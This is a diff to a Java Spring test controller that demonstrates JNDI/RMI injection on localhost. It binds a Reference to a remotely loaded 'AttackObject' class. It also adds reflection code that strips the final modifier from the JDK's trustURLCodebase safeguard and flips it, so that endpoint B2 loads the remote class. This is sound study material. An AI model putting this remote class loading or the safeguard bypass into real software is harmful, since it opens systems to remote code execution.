@@ -1,15 +1,16 @@
 package cn.moonlord.test;
 
-import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import com.sun.jndi.rmi.registry.*;
 import io.swagger.annotations.*;
 import org.slf4j.*;
 import org.springframework.web.bind.annotation.*;
 
-import javax.naming.Reference;
+import javax.naming.*;
 import java.io.*;
+import java.lang.reflect.*;
 import java.rmi.*;
 import java.rmi.registry.*;
-import java.rmi.server.UnicastRemoteObject;
+import java.rmi.server.*;
 
 @Api(tags = "JNDI 测试")
 @RestController
@@ -57,6 +58,19 @@ public class JNDITestController {
         }
     }
 
+    private static void resetRegistryContext(Boolean trustURLCodebase) throws Exception {
+        Field[] fields = RegistryContext.class.getDeclaredFields();
+        for (Field field: fields) {
+            if(field.getName().equals("trustURLCodebase")){
+                field.setAccessible(true);
+                Field modifiers = Field.class.getDeclaredField("modifiers");
+                modifiers.setAccessible(true);
+                modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
+                field.setBoolean(null, trustURLCodebase);
+            }
+        }
+    }
+
     @ApiOperation(value="测试用例 A1，启动 RMI 服务端")
     @GetMapping(value = "/TestA1")
     @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "listenPort", example = "9000")})
@@ -64,15 +78,15 @@ public class JNDITestController {
         RemoteTask remoteTask = new RemoteTask();
         UnicastRemoteObject.exportObject(remoteTask, 0);
         LocalTask localTask = new LocalTask();
-        Reference attackObject = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:8080/AttackObject.class");
+        Reference attackObject = new Reference("AttackObject", "AttackObject", "http://127.0.0.1:8080/JNDI/AttackObject.class");
         ReferenceWrapper attackObjectWrapper = new ReferenceWrapper(attackObject);
         Registry registry = LocateRegistry.createRegistry(registryPort);
         logger.info("registry : " + registry);
         registry.bind("remoteTask", remoteTask);
         registry.bind("localTask", localTask);
-        registry.bind("attackObject", attackObjectWrapper);
         Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/remoteTask", remoteTask);
         Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/localTask", localTask);
+        Naming.bind("rmi://127.0.0.1:" + registryPort + "/naming/attackObject", attackObjectWrapper);
         for(String name : registry.list()){
             logger.info("registry name : " + name);
         }
@@ -143,20 +157,36 @@ public class JNDITestController {
         return task.execute(message).toString();
     }
 
-    @ApiOperation(value="测试用例 A6，启动 RMI 客户端，Naming.lookup 调用远程方法，在服务器上执行")
-    @GetMapping(value = "/TestA6")
+    @ApiOperation(value="测试用例 B1，启动 RMI 客户端，Context.lookup 获取远程 ReferenceWrapper 对象，高版本 JDK 会报错提示 untrusted")
+    @GetMapping(value = "/TestB1")
     @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
-    public String TestA6(@RequestParam Integer registryPort) throws Exception {
+    public String TestB1(@RequestParam Integer registryPort) throws Exception {
         Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
         logger.info("registry : " + registry);
         for(String name : registry.list()){
             logger.info("registry name : " + name);
         }
-        Task task = (Task) registry.lookup("attackObject");
-        logger.info("task : " + task);
-        Message message = new Message("Hello World");
-        logger.info("message : " + message + " " + message.message);
-        return task.execute(message).toString();
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
+        Context ctx = new InitialContext();
+        resetRegistryContext(false);
+        Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
+        return String.valueOf(object);
+    }
+
+    @ApiOperation(value="测试用例 B2，在 B1 的基础上，设置 com.sun.jndi.rmi.object.trustURLCodebase 为 true，远程对象加载成功")
+    @GetMapping(value = "/TestB2")
+    @ApiImplicitParams({@ApiImplicitParam(name = "registryPort", value = "serverPort", example = "9000")})
+    public String TestB2(@RequestParam Integer registryPort) throws Exception {
+        Registry registry = LocateRegistry.getRegistry("127.0.0.1", registryPort);
+        logger.info("registry : " + registry);
+        for(String name : registry.list()){
+            logger.info("registry name : " + name);
+        }
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        Context ctx = new InitialContext();
+        resetRegistryContext(true);
+        Object object = ctx.lookup("rmi://127.0.0.1:" + registryPort + "/naming/attackObject");
+        return String.valueOf(object);
     }
 
 }
